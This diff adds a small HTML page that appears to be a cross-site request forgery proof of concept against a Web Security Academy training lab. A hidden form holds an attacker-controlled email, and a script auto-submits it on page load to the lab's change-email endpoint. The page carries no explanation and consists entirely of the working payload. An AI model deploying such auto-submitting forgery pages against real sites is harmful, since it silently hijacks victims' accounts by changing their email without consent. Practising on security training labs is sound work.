@@ -1,0 +1,17 @@
+<html>
+  <body>
+    <h1>Heelo wordl!</h1>
+    <form
+      action="https://0a4900f804d7459f80d76c6b00850019.web-security-academy.net/my-account/change-email/"
+      method="POST"
+      id="csrf-form"
+    >
+      <input type="hidden" name="email" value="attackerdud@gmail.com" />
+    </form>
+
+    <script> 
+      //     document.getElementById("csrf-form").submit(); // auto submit
+      document.forms[0].submit();
+    </script>
+  </body>
+</html>
